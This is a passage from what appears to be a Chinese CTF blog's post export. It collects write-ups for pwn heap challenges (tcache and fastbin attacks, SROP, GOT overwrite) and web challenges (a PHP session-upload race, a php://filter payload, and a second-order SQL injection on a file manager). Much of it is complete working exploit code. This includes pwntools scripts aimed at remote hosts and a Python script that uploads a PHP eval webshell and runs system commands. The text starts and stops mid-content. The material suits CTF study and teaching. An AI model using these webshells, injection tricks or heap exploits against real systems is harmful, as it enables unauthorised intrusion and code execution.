libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4526acreate(0x60, b&#x27;a&#x27;*0x60)  # 4delete(2)delete(1)delete(4)create(0x60, p64(malloc_hook-0x20+5-8))  # 1create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*(0x20-5-8-8)+p64(one_gadget)+p64(realloc+0xc))# create(1, b&#x27;&#x27;)r.recvuntil(b&#x27;choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size?&#x27;)r.sendline(bytes(str(0x10), encoding=&#x27;utf-8&#x27;))info(hex(one_gadget))info(hex(realloc))# gdb.attach(r)# flag = flag&#123;e919bec8-e5a6-4c1d-a44a-282f08c57c06&#125;r.interactive()\n\neasyTHeap这道题漏洞发生在delete函数内，没有清楚指针造成UAF\nint sub_D2C()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 6 || !*(&amp;unk_202080 + v1) )    exit(0);  free(*(&amp;unk_202080 + v1));  dword_202060[v1] = 0;  return puts(&quot;Done!&quot;);&#125;\n\n通过UAF得到tcache struct chunk的地址，再利用double free实现控制tcache struct chunk，进行tcache struct attack。这道题和GFCTF那道题很类似，不过这道简单一点，这里就不赘述可以去看复现GFCTF的那一篇 https://cv196082.gitee.io/2022/01/11/GFCTF/ \nexpfrom pwn import *# r = process(&#x27;./vn_pwn_easyTHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 25768)elf = ELF(&#x27;./vn_pwn_easyTHeap&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x50)  # 0delete(0)delete(0)show(0)tcache_struct_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))-0x250print(hex(tcache_struct_addr))create(0x50)  # 1edit(1, p64(tcache_struct_addr))# delete(2)create(0x50)  # 2create(0x50)  # 3  tcache_structedit(3, b&#x27;a&#x27;*0x28)delete(3)show(3)main_arena_96 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc_addr = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4f322create(0x60)  # 4edit(4, b&#x27;\\x00&#x27;*0x40+p64(0)*2+p64(malloc_hook-8))create(0x30)  # 5edit(5, p64(one_gadget)+p64(realloc_addr+8))# gdb.attach(r)create(1)r.interactive()# flag:flag&#123;ce977aa0-80c8-48c6-a1d0-24ec4f55ce17&#125;\n\nwarmup题目很简单，不过需要gdb调试一下，调试一下会发现，第一个不存在栈溢出的函数和第二个存在栈溢出的函数的两个栈地址是相邻的。\nexpfrom pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26531)#r = process(&#x27;./vn_pwn_warmup&#x27;)elf = ELF(&#x27;./vn_pwn_warmup&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(&#x27;gift: &#x27;)puts_addr = int(r.recvline()[:-1], 16)libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]pop_rdi_ret = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]payload = b&#x27;a&#x27;*0x70 + b&#x27;b&#x27;*0x8payload += p64(pop_rdi_ret)payload2 = p64(0) + p64(pop_rsi_ret) + p64(free_hook) + \\    p64(pop_rdx_ret) + p64(4) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + \\    p64(pop_rsi_ret) + p64(0) + p64(open_addr)payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + \\    p64(free_hook) + p64(pop_rdx_ret) + p64(100) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)r.recvuntil(&#x27;something: &#x27;)r.send(payload2)r.recvuntil(&#x27;name?&#x27;)r.send(payload)r.send(&#x27;flag&#x27;)r.interactive()# flag:flag&#123;963b2367-7364-44bf-8352-2c5552e4219e&#125;\n\nbabybabypwn这一个是最头疼的，不过我写的exp后面改得和其他wp一样也是打不通就很烦。\n这道题使用的是SROP攻击，原理我还没怎么看懂，不过做题我应该能做出来，所以我就放个exp，后面会把SROP的原理和相关例题在做一篇博客。\nexpfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# r = process(&#x27;./vn_pwn_babybabypwn_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29297)elf = ELF(&#x27;./vn_pwn_babybabypwn_1&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(b&#x27;Here is my gift: 0x&#x27;)puts_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]info(hex(libc_base))libc_bss = libc.bss()+libc_base+0x100pop_rdi = libc_base + 0x21102pop_rsi = libc_base + 0x202e8pop_rdx = libc_base + 0x1b92read_addr = libc.symbols[&#x27;read&#x27;]+libc_baseopen_addr = libc.symbols[&#x27;open&#x27;]+libc_basewrite_addr = libc.symbols[&#x27;write&#x27;]+libc_baser.recvuntil(b&#x27;Please input magic message: &#x27;)frame = SigreturnFrame()frame.rdi = 0frame.rsi = libc_bssframe.rdx = 0x100frame.rip = read_addrframe.rsp = libc_bssr.send(bytes(str(frame), encoding=&#x27;utf8&#x27;)[8:])flag_addr = libc_bss+0x98payload = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(write_addr)payload += b&#x27;flag\\x00&#x27;r.send(payload)r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"WMCTF2020_Make_PHP_Great_Again","url":"/2021/10/26/WMCTF2020-Make-PHP-Great-Again/","content":"题目源码:\n&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;\n\n题目是直接用的require_once所以在下面直接引用flag.php是不得行的。那第一反应就是phpsession条件竞争了\n非预期解import requestsfrom threading import Thread, Eventimport timesession_id = &#x27;cv196082&#x27;url = &#x27;http://26540d71-1264-4901-a9a1-8174d8614ffe.node4.buuoj.cn:81/&#x27;def upload(session):    data = &#123;        &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&#x27;    &#125;    file = &#123;        &#x27;file&#x27;: (&#x27;shell.txt&#x27;, b&#x27;a&#x27;*0x1000)    &#125;    headers = &#123;        &quot;Cookie&quot;: &#x27;PHPSESSID=&#x27;+session_id    &#125;    session.post(url=url, data=data, headers=headers, files=file)def getshell(session):    data = &#123;        &#x27;shell&#x27;: &#x27;system(&quot;cat flag.php&quot;);&#x27;    &#125;    attack_url = url+&#x27;?file=/tmp/sess_&#x27;+session_id    res = session.post(url=attack_url, data=data)    if &#x27;upload_progress_&#x27; in res.text:        print(&quot;res:&quot;+res.text)        Event().clear()if __name__ == &#x27;__main__&#x27;:    with requests.session() as session:        for i in range(30):            t1 = Thread(target=upload, args=(session,))            t1.start()            t2 = Thread(target=getshell, args=(session,))            t2.start()            time.sleep(0.3)\n\n预期解payload:\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\n关于预期解的原理我还没去了解\n","categories":["web-buuctf"],"tags":["条件竞争"]},{"title":"XDCTF_2015_filemanager","url":"/2021/12/06/XDCTF-2015-filemanager/","content":"信息搜集扫描出来网站有源码泄漏www.tar.xz\n代码审计index.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:46 */?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;file manage&lt;/title&gt;    &lt;base href=&quot;./&quot;&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;Control&lt;/h3&gt;    &lt;ul style=&quot;list-style: none;&quot;&gt;        &lt;li&gt;&lt;a href=&quot;./delete.php&quot;&gt;Delete file&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href=&quot;./rename.php&quot;&gt;Rename file&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;    &lt;h3&gt;Content&lt;/h3&gt;    &lt;form action=&quot;./upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;input type=&quot;file&quot; name=&quot;upfile&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;upload file&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nupload.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午8:45 */require_once &quot;common.inc.php&quot;;if ($_FILES) &#123;\t$file = $_FILES[&quot;upfile&quot;];\tif ($file[&quot;error&quot;] == UPLOAD_ERR_OK) &#123;\t\t$name = basename($file[&quot;name&quot;]);\t\t$path_parts = pathinfo($name);\t\tif (!in_array($path_parts[&quot;extension&quot;], array(&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;zip&quot;, &quot;txt&quot;))) &#123;\t\t\texit(&quot;error extension&quot;);\t\t&#125;\t\t$path_parts[&quot;extension&quot;] = &quot;.&quot; . $path_parts[&quot;extension&quot;];\t\t$name = $path_parts[&quot;filename&quot;] . $path_parts[&quot;extension&quot;];\t\t// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);\t\t// Fix\t\t$path_parts[&#x27;filename&#x27;] = addslashes($path_parts[&#x27;filename&#x27;]);\t\t$sql = &quot;select * from `file` where `filename`=&#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27; and `extension`=&#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;&quot;;\t\t$fetch = $db-&gt;query($sql);\t\tif ($fetch-&gt;num_rows &gt; 0) &#123;\t\t\texit(&quot;file is exists&quot;);\t\t&#125;\t\tif (move_uploaded_file($file[&quot;tmp_name&quot;], UPLOAD_DIR . $name)) &#123;\t\t\t$sql = &quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27;, 0, &#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;)&quot;;\t\t\t$re = $db-&gt;query($sql);\t\t\tif (!$re) &#123;\t\t\t\tprint_r($db-&gt;error);\t\t\t\texit;\t\t\t&#125;\t\t\t$url = &quot;/&quot; . UPLOAD_DIR . $name;\t\t\techo &quot;Your file is upload, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t\t&#125; else &#123;\t\t\texit(&quot;upload error&quot;);\t\t&#125;\t&#125; else &#123;\t\tprint_r(error_get_last());\t\texit;\t&#125;&#125;\n\ncommon.inc.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:58 */$DATABASE = array(\t&quot;host&quot; =&gt; &quot;127.0.0.1&quot;,\t&quot;username&quot; =&gt; &quot;tcdy&quot;,\t&quot;password&quot; =&gt; &quot;1&quot;,\t&quot;dbname&quot; =&gt; &quot;xdctf&quot;,);$db = new mysqli($DATABASE[&#x27;host&#x27;], $DATABASE[&#x27;username&#x27;], $DATABASE[&#x27;password&#x27;], $DATABASE[&#x27;dbname&#x27;]);$req = array();foreach (array($_GET, $_POST, $_COOKIE) as $global_var) &#123;\tforeach ($global_var as $key =&gt; $value) &#123;\t\tis_string($value) &amp;&amp; $req[$key] = addslashes($value);\t&#125;&#125;define(&quot;UPLOAD_DIR&quot;, &quot;upload/&quot;);function redirect($location)&#123;\theader(&quot;Location: &#123;$location&#125;&quot;);\texit;&#125;\n\ndelete.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;if(isset($req[&#x27;filename&#x27;])) &#123;    $result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;filename&#x27;]&#125;&#x27;&quot;);    if ($result-&gt;num_rows&gt;0)&#123;        $result = $result-&gt;fetch_assoc();    &#125;    $filename = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];    if ($result &amp;&amp; file_exists($filename)) &#123;        $db-&gt;query(&#x27;delete from `file` where `fid`=&#x27; . $result[&quot;fid&quot;]);        unlink($filename);        redirect(&quot;/&quot;);    &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;file manage&lt;/title&gt;    &lt;base href=&quot;/&quot;&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;h3&gt;Delete file&lt;/h3&gt;&lt;body&gt;    &lt;form method=&quot;post&quot;&gt;        &lt;p&gt;            &lt;span&gt;delete filename(exclude extension)：&lt;/span&gt;            &lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;        &lt;/p&gt;        &lt;p&gt;            &lt;input type=&quot;submit&quot; value=&quot;delete&quot;&gt;        &lt;/p&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nrename.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;if (isset($req[&#x27;oldname&#x27;]) &amp;&amp; isset($req[&#x27;newname&#x27;])) &#123;\t$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);\tif ($result-&gt;num_rows &gt; 0) &#123;\t\t$result = $result-&gt;fetch_assoc();\t&#125; else &#123;\t\texit(&quot;old file doesn&#x27;t exists!&quot;);\t&#125;\tif ($result) &#123;\t\t$req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);\t\t$sql = &quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;;\t\t$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);\t\tif (!$re) &#123;\t\t\tprint_r($db-&gt;error);\t\t\texit;\t\t&#125;\t\t$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];\t\t$newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];\t\tif (file_exists($oldname)) &#123;\t\t\trename($oldname, $newname);\t\t&#125;\t\t$url = &quot;/&quot; . $newname;\t\techo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t&#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;\t&lt;title&gt;file manage&lt;/title&gt;\t&lt;base href=&quot;/&quot;&gt;\t&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;h3&gt;Rename&lt;/h3&gt;&lt;body&gt;\t&lt;form method=&quot;post&quot;&gt;\t\t&lt;p&gt;\t\t\t&lt;span&gt;old filename(exclude extension)：&lt;/span&gt;\t\t\t&lt;input type=&quot;text&quot; name=&quot;oldname&quot;&gt;\t\t&lt;/p&gt;\t\t&lt;p&gt;\t\t\t&lt;span&gt;new filename(exclude extension)：&lt;/span&gt;\t\t\t&lt;input type=&quot;text&quot; name=&quot;newname&quot;&gt;\t\t&lt;/p&gt;\t\t&lt;p&gt;\t\t\t&lt;input type=&quot;submit&quot; value=&quot;rename&quot;&gt;\t\t&lt;/p&gt;\t&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n可以看到upload.php是不存在注入点的，由因为白名单限制没法上传一句话的文件。但是rename文件可以修改文件名。\nif ($result) &#123;    $req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);    $sql = &quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;;    $re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);    if (!$re) &#123;        print_r($db-&gt;error);        exit;    &#125;    $oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];    $newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];    if (file_exists($oldname)) &#123;        rename($oldname, $newname);    &#125;    $url = &quot;/&quot; . $newname;    echo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;&#125;\n\n这里对于oldname没有检查和处理，并且在下面是直接修改文件名字。描述起来比较费劲，就直接上图吧。\n\n构造一个文件名为&#39;,extension=&#39;&#39;,filename=&#39;wow.gif.gif的文件上传，两个gif是用第二个去逃避那个extension字段\n\n\n数据库和upload文件夹的结果就是这样\n现在去rename一个\n\n在rename里面的sql语句就是这样，那此时的extension就被置空了\n\n\n这时候上传一个一句话wow.gif\n\n\n\n现在数据储存的就是这样两个，下一步直接rename，修改木马尾缀\n\n此时就是将oldname修改到newname了，用蚁剑连接就好了\n","categories":["web-buuctf"],"tags":["二次注入"]},{"title":"babyfengshui","url":"/2021/11/24/babyfengshui/","content":"检查程序\n打开了canary和nx但是是partial relro。\n流程分析void __cdecl __noreturn main()&#123;  char v0; // [esp+3h] [ebp-15h] BYREF  int v1; // [esp+4h] [ebp-14h] BYREF  int v2[4]; // [esp+8h] [ebp-10h] BYREF  v2[1] = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  alarm(0x14u);  while ( 1 )  &#123;    puts(&quot;0: Add a user&quot;);    puts(&quot;1: Delete a user&quot;);    puts(&quot;2: Display a user&quot;);    puts(&quot;3: Update a user description&quot;);    puts(&quot;4: Exit&quot;);    printf(&quot;Action: &quot;);    if ( __isoc99_scanf(&quot;%d&quot;, &amp;v1) == -1 )      break;    if ( !v1 )    &#123;      printf(&quot;size of description: &quot;);      __isoc99_scanf(&quot;%u%c&quot;, v2, &amp;v0);      add_user(v2[0]);    &#125;    if ( v1 == 1 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      delete_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 2 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      display_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 3 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      update_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 4 )    &#123;      puts(&quot;Bye&quot;);      exit(0);    &#125;    if ( (unsigned __int8)byte_804B069 &gt; 0x31u )    &#123;      puts(&quot;maximum capacity exceeded, bye&quot;);      exit(0);    &#125;  &#125;  exit(1);&#125;\n\n可以看出来又是一道菜单题\nadd一个用户的时候\n_DWORD *__cdecl add_user(size_t a1)&#123;  void *s; // [esp+14h] [ebp-14h]  _DWORD *v3; // [esp+18h] [ebp-10h]  s = malloc(a1);  memset(s, 0, a1);  v3 = malloc(0x80u);  memset(v3, 0, 0x80u);  *v3 = s;  *(&amp;ptr + (unsigned __int8)byte_804B069) = v3;  printf(&quot;name: &quot;);  sub_80486BB((char *)*(&amp;ptr + (unsigned __int8)byte_804B069) + 4, 124);  update_user((unsigned __int8)byte_804B069++);  return v3;&#125;\n\nuser的结构体可以看成\nstruct user&#123;    int *description;// 存放description这个chunk的指针    char name[0x7c];&#125;\n\n\n\n这里没有堆溢出，堆溢出主要发生在update_user\nunsigned int __cdecl update_user(unsigned __int8 a1)&#123;  char v2; // [esp+17h] [ebp-11h] BYREF  int v3; // [esp+18h] [ebp-10h] BYREF  unsigned int v4; // [esp+1Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  if ( a1 &lt; (unsigned __int8)byte_804B069 &amp;&amp; *(&amp;ptr + a1) )  &#123;    v3 = 0;    printf(&quot;text length: &quot;);    __isoc99_scanf(&quot;%u%c&quot;, &amp;v3, &amp;v2);    if ( (char *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (char *)*(&amp;ptr + a1) - 4 )    &#123;      puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);      exit(1);    &#125;    printf(&quot;text: &quot;);    sub_80486BB(*(_DWORD *)*(&amp;ptr + a1), v3 + 1);  &#125;  return __readgsdword(0x14u) ^ v4;&#125;\n\n虽然写入的长度我们可控但是这里有一个限制条件\nif ( (char *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (char *)*(&amp;ptr + a1) - 4 )\n\n翻译过来就是输入的长度加上description堆块的地址必须小于user堆块的地址\n利用思路虽然两个malloc是相邻的，但是不代表他们的chunk是相邻的，因为我们还可以删除控制bin。\n首先add两个description为0x20的用户(user_chunk已经默认为0x80了)\n然后delete第一个user，此时内存剩下来一个大小为0x20和0x80的chunk\n这个时候再add一个description为0x80的chunk，由于是先malloc description这个chunk所以他会占据我们delete掉的user的user_chunk\n这时候就可以进行堆溢出，堆溢出的思路就是覆盖掉第二个user的user_chunk的第三个字节也就是存放description指针的位置\n然后display第二个user就可以实现读取任意地址，update第二个就可以实现写入任意地址\nexpfrom pwn import *elf = ELF(&#x27;./babyfengshui/babyfengshui&#x27;)libc = ELF(&#x27;./babyfengshui/libc.so.6&#x27;)r = process(&#x27;./babyfengshui/babyfengshui&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 57741)context.log_level = &#x27;debug&#x27;free_got_addr = elf.got[&#x27;free&#x27;]def add_user(description_size, name, text_length, text):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;size of description: &#x27;)    r.sendline(bytes(str(description_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;text length:&#x27;)    r.sendline(bytes(str(text_length), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text:&#x27;)    r.sendline(text)def delete_user(index):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))def display_user(index):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))def update_user(index, text_length, text):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text length:&#x27;)    r.sendline(bytes(str(text_length), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text:&#x27;)    r.sendline(text)def exit():    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;4&#x27;)if __name__ == &#x27;__main__&#x27;:    add_user(0x20, b&#x27;196082&#x27;, 0x20, b&#x27;a&#x27;*0x20)    add_user(0x20, b&#x27;196082&#x27;, 0x20, b&#x27;b&#x27;*0x20)    add_user(0x8, b&#x27;196082&#x27;, 0x8, b&#x27;/bin/sh\\x00&#x27;)    # gdb.attach(r)    # pause()    delete_user(0)    payload = b&#x27;c&#x27;*0x80+p32(0x90)+p32(0x31)+b&#x27;d&#x27;*0x20 + \\        p32(0x30)+p32(0x91)+p32(free_got_addr)    add_user(0x80, b&#x27;196082&#x27;, 0x8, &#x27;aaaa&#x27;)    update_user(3, len(payload), payload)    display_user(1)    r.recvuntil(b&#x27;description: &#x27;)    free_real_addr = u32(r.recv(4))# 有毒的地方是这道题的libc好像有点问题，我调了很久完全没问题，但是就是这玩意开始用的libc.symbols[&#x27;free&#x27;]就是打不通，看了大佬的wp发现是自己写的地址    offset = free_real_addr-0x070750    system_addr = offset+0x03a940    print(hex(free_real_addr))    print(hex(system_addr))    update_user(1, 4, p32(system_addr))    delete_user(2)    r.interactive()\n\n","categories":["pwn-xctf"],"tags":["堆溢出|篡改GOT表"]},{"title":"babyheap_0ctf_2017","url":"/2022/01/14/babyheap-0ctf-2017/","content":"突然之间发现自己的博客好像还没发过有关fastbin attack的内容，今天抽时间写了一篇\n检测保护\n保护全开。\n流程分析是一个很常规的菜单题。在create函数内部使用的calloc的生成chunk，区别就是会清理生成chunk的内部值。\nvoid __fastcall sub_D48(__int64 a1)&#123;  int i; // [rsp+10h] [rbp-10h]  int v2; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  &#123;    if ( !*(_DWORD *)(24LL * i + a1) )    &#123;      printf(&quot;Size: &quot;);      v2 = sub_138C();      if ( v2 &gt; 0 )      &#123;        if ( v2 &gt; 4096 )          v2 = 4096;        v3 = calloc(v2, 1uLL);        if ( !v3 )          exit(-1);        *(_DWORD *)(24LL * i + a1) = 1;        *(_QWORD *)(a1 + 24LL * i + 8) = v2;        *(_QWORD *)(a1 + 24LL * i + 16) = v3;        printf(&quot;Allocate Index %d\\n&quot;, (unsigned int)i);      &#125;      return;    &#125;  &#125;&#125;\n\nedit函数就只是判断了chunk是否存在，你写入的内容大小并没有判断，可以造成堆溢出\n__int64 __fastcall sub_E7F(__int64 a1)&#123;  __int64 result; // rax  int v2; // [rsp+18h] [rbp-8h]  int v3; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )  &#123;    result = *(unsigned int *)(24LL * (int)result + a1);    if ( (_DWORD)result == 1 )    &#123;      printf(&quot;Size: &quot;);      result = sub_138C();      v3 = result;      if ( (int)result &gt; 0 )      &#123;        printf(&quot;Content: &quot;);        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);      &#125;    &#125;  &#125;  return result;&#125;\n\ndelete函数可以看到不存在UAF。\n__int64 __fastcall sub_F50(__int64 a1)&#123;  __int64 result; // rax  int v2; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )  &#123;    result = *(unsigned int *)(24LL * (int)result + a1);    if ( (_DWORD)result == 1 )    &#123;      